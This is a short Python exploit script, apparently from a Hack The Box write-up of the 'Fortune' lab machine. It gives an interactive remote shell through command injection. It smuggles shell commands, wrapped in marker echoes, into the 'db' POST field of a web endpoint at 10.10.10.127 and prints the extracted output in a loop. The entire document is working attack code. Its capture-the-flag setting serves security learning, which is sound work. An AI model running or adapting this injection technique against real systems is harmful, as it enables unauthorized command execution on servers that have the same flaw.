#!/usr/bin/python3
import requests
import sys

'''
Write-up : https://0xrick.github.io/hack-the-box/fortune/

RCE exploitation script from Hack The Box - Fortune 
'''

YELLOW = "\033[93m"
GREEN = "\033[32m"

def exploit(payload):
	post_data = {"db":payload}
	req = requests.post("http://10.10.10.127/select",data=post_data)
	response = req.text
	return response

def filter(response):
	start = "rce_result"
	end = "rce_result_end"
	result = response[response.find(start)+len(start):response.rfind(end)]
	return result

while True:
	rce = input(GREEN + "[?] command : ")
	payload = ";echo rce_result;{};echo rce_result_end".format(rce)
	response = exploit(payload)
	result = filter(response)
	print(YELLOW + "[*] Result :")
	print(result)